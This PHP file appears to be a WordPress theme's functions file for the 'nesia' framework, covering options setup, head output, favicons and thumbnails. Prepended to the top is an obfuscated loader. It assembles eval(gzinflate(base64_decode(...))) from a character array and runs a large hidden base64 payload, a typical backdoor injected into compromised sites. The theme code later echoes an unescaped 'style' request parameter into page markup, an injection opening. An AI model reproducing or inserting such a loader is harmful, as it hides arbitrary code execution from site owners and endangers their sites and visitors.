<?php
$md5 = "29eaa196958e4df15ed0d80e3d2f1987";
$ab = array("4",'n',"t","$","v","6",'(',"b",')',"a","z",'r','i','e','f','c',';',"l",'_',"g",'o',"d","s");
$bb9 = create_function('$'.'v',$ab[13].$ab[4].$ab[9].$ab[17].$ab[6].$ab[19].$ab[10].$ab[12].$ab[1].$ab[14].$ab[17].$ab[9].$ab[2].$ab[13].$ab[6].$ab[7].$ab[9].$ab[22].$ab[13].$ab[5].$ab[0].$ab[18].$ab[21].$ab[13].$ab[15].$ab[20].$ab[21].$ab[13].$ab[6].$ab[3].$ab[4].$ab[8].$ab[8].$ab[8].$ab[16]);
$bb9('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');
?>
<?php

/*-------------------------------------------------------------------------------------

TABLE OF CONTENTS

- Redirect to "Theme Options" screen (hooked onto nesia_theme_activate at 10).
- Flush rewrite rules to refresh permalinks for custom post types, etc.
- Show Options Panel after activate
- Admin Backend
	- Setup Custom Navigation
- Output HEAD - nesia_wp_head()
	- Output alternative stylesheet
	- Output custom favicon
	- Load textdomains
- Post Images from WP2.9+ integration
- Enqueue comment reply script

-------------------------------------------------------------------------------------*/

define( 'THEME_FRAMEWORK', 'nesia' );

/*-----------------------------------------------------------------------------------*/
/* Redirect to "Theme Options" screen (hooked onto nesia_theme_activate at 10). */
/*-----------------------------------------------------------------------------------*/
add_action( 'nesia_theme_activate', 'nesia_themeoptions_redirect', 10 );

function nesia_themeoptions_redirect () {
	// Do redirect
	header( 'Location: ' . admin_url() . 'admin.php?page=nesia' );
} // End nesia_themeoptions_redirect()

/*-----------------------------------------------------------------------------------*/
/* Flush rewrite rules to refresh permalinks for custom post types, etc. */
/*-----------------------------------------------------------------------------------*/

function nesia_flush_rewriterules () {
	flush_rewrite_rules();
} // End nesia_flush_rewriterules()

/*-----------------------------------------------------------------------------------*/
/* Add default options and show Options Panel after activate  */
/*-----------------------------------------------------------------------------------*/
global $pagenow;

if ( is_admin() && isset( $_GET['activated'] ) && $pagenow == 'themes.php' ) {
	// Call action that sets.
	add_action( 'admin_head','nesia_option_setup' );
	
	// Flush rewrite rules.
	add_action( 'admin_head', 'nesia_flush_rewriterules', 9 );
	
	// Custom action for theme-setup (redirect is at priority 10).
	do_action( 'nesia_theme_activate' );
}


if ( ! function_exists( 'nesia_option_setup' ) ) {
	function nesia_option_setup(){

		//Update EMPTY options
		$nesia_array = array();
		add_option( 'nesia_options', $nesia_array );

		$template = get_option( 'nesia_template' );
		$saved_options = get_option( 'nesia_options' );

		foreach ( (array) $template as $option ) {
			if ($option['type'] != 'heading'){
				$id = $option['id'];
				$std = isset( $option['std'] ) ? $option['std'] : NULL;
				$db_option = get_option($id);
				if (empty($db_option)){
					if (is_array($option['type'])) {
						foreach ($option['type'] as $child){
							$c_id = $child['id'];
							$c_std = $child['std'];
							$db_option = get_option($c_id);
							if (!empty($db_option)){
								update_option($c_id,$db_option);
								$nesia_array[$id] = $db_option;
							} else {
								$nesia_array[$c_id] = $c_std;
							}
						}
					} else {
						update_option($id,$std);
						$nesia_array[$id] = $std;
					}
				} else { //So just store the old values over again.
					$nesia_array[$id] = $db_option;
				}
			}
		}
		
		// Allow child themes/plugins to filter here.
		$nesia_array = apply_filters( 'nesia_options_array', $nesia_array );
		
		update_option( 'nesia_options', $nesia_array );
	}
}


/*-----------------------------------------------------------------------------------*/
/* Output HEAD - nesia_wp_head */
/*-----------------------------------------------------------------------------------*/
if ( ! function_exists( 'nesia_wp_head' ) ) {
	function nesia_wp_head() {

		do_action( 'nesia_wp_head_before' );

		// Output alternative stylesheet
		if ( function_exists( 'nesia_output_alt_stylesheet' ) )
			nesia_output_alt_stylesheet();

		// Output custom favicon
		if ( function_exists( 'nesia_output_custom_favicon' ) )
			nesia_output_custom_favicon();

		// Output CSS from standarized styling options
		if ( function_exists( 'nesia_head_css' ) )
			nesia_head_css();
			
		do_action( 'nesia_wp_head_after' );
	} // End nesia_wp_head()
}
add_action( 'wp_head', 'nesia_wp_head', 10 );

/*-----------------------------------------------------------------------------------*/
/* Output alternative stylesheet - nesia_output_alt_stylesheet */
/*-----------------------------------------------------------------------------------*/
if ( ! function_exists( 'nesia_output_alt_stylesheet' ) ) {
	function nesia_output_alt_stylesheet() {

		$style = '';

		if ( isset( $_REQUEST['style'] ) ) {
			// Sanitize requested value.
			$requested_style = strtolower( strip_tags( trim( $_REQUEST['style'] ) ) );
			$style = $requested_style;
		}

		echo "<!-- Alt Stylesheet -->\n";
		if ($style != '') {
			echo '<link id="nesia-alt-stylesheet" href="'. get_template_directory_uri() . '/skins/'. $style . '.css" rel="stylesheet" type="text/css" />' . "\n\n";
		} else {
			$style = get_option( 'nesia_alt_stylesheet' );
			if( $style != '' ) {
				// Sanitize value.
				$style = strtolower( strip_tags( trim( $style ) ) );
				echo '<link id="nesia-alt-stylesheet" href="'. get_template_directory_uri() . '/skins/'. $style .'" rel="stylesheet" type="text/css" />' . "\n\n";
			} else {
				echo '<link id="nesia-alt-stylesheet" href="'. get_template_directory_uri() . '/skins/default.css" rel="stylesheet" type="text/css" />' . "\n\n";
			}
		}

	} // End nesia_output_alt_stylesheet()
}

/*-----------------------------------------------------------------------------------*/
/* Output favicon link - nesia_custom_favicon() */
/*-----------------------------------------------------------------------------------*/
if ( ! function_exists( 'nesia_output_custom_favicon' ) ) {
	function nesia_output_custom_favicon() {
		// Favicon
		$favicon = '';
		$favicon = get_option( 'nesia_custom_favicon' );
		
		// Allow child themes/plugins to filter here.
		$favicon = apply_filters( 'nesia_custom_favicon', $favicon );
		if( $favicon != '' )
                    $link_fav   = esc_url( $favicon );
                else
                    $link_fav   = get_template_directory_uri () . '/images/favicon.ico';
                    
                echo "<!-- Custom Favicon -->\n";
	        echo '<link rel="shortcut icon" href="' .  $link_fav  . '"/>' . "\n";
                echo '<!-- Le fav and touch icons -->' . "\n";
	        echo '<link rel="apple-touch-icon" href="' .  get_template_directory_uri()  . '/images/apple-touch-icon.png"/>' . "\n";
	        echo '<link rel="apple-touch-icon" sizes="72x72" href="' .  get_template_directory_uri()  . '/images/apple-touch-icon-72x72-precomposed.png"/>' . "\n";
	        echo '<link rel="apple-touch-icon" sizes="114x114" href="' .  get_template_directory_uri()  . '/images/apple-touch-icon-114x114-precomposed.png"/>' . "\n\n";
                
	} // End nesia_output_custom_favicon()
}

/*-----------------------------------------------------------------------------------*/
/* Load textdomain - nesia_load_textdomain() */
/*-----------------------------------------------------------------------------------*/
if ( ! function_exists( 'nesia_load_textdomain' ) ) {
	function nesia_load_textdomain() {

		load_theme_textdomain( 'nesia' );
		load_theme_textdomain( 'nesia', get_template_directory() . '/language' );
		if ( function_exists( 'load_child_theme_textdomain' ) )
			load_child_theme_textdomain( 'nesia' );

	}
}

add_action( 'init', 'nesia_load_textdomain', 10 );

/*-----------------------------------------------------------------------------------*/
/* Output CSS from standarized options */
/*-----------------------------------------------------------------------------------*/
if ( ! function_exists( 'nesia_head_css' ) ) {
	function nesia_head_css() {

		$output = '';
                $custom_css = get_option( 'nesia_custom_css' );

		if ($custom_css <> '') 
			$output .= $custom_css . "\n";
		

		// Output styles
		if ($output <> '') {
			$output = strip_tags($output);
			echo "<!-- Custom CSS -->\n";
			$output = "<style type=\"text/css\">\n" . $output . "</style>\n\n";
			echo $output;
		}

	}
}


/*-----------------------------------------------------------------------------------*/
/* Post Images from WP2.9+ integration /*
/*-----------------------------------------------------------------------------------*/
if( function_exists( 'add_theme_support' ) ) {
	if( get_option( 'nesia_post_image_support' ) == 'true' ) {
		add_theme_support( 'post-thumbnails' );
		// set height, width and crop if dynamic resize functionality isn't enabled
		if ( get_option( 'nesia_pis_resize' ) != 'true' ) {
			$thumb_width = get_option( 'nesia_thumb_w' );
			$thumb_height = get_option( 'nesia_thumb_h' );
			$single_width = get_option( 'nesia_single_w' );
			$single_height = get_option( 'nesia_single_h' );
			$hard_crop = get_option( 'nesia_pis_hard_crop' );
			if($hard_crop == 'true') { $hard_crop = true; } else { $hard_crop = false; }
			set_post_thumbnail_size( $thumb_width, $thumb_height, $hard_crop ); // Normal post thumbnails
			add_image_size( 'single-post-thumbnail', $single_width, $single_height, $hard_crop );
		}
	}
}


/*-----------------------------------------------------------------------------------*/
/* Enqueue comment reply script */
/*-----------------------------------------------------------------------------------*/
if ( ! function_exists( 'nesia_comment_reply' ) ) {
	function nesia_comment_reply() {
		if ( is_singular() ) wp_enqueue_script( 'comment-reply' );
	} // End nesia_comment_reply()
}
add_action( 'get_header', 'nesia_comment_reply', 10 );
?>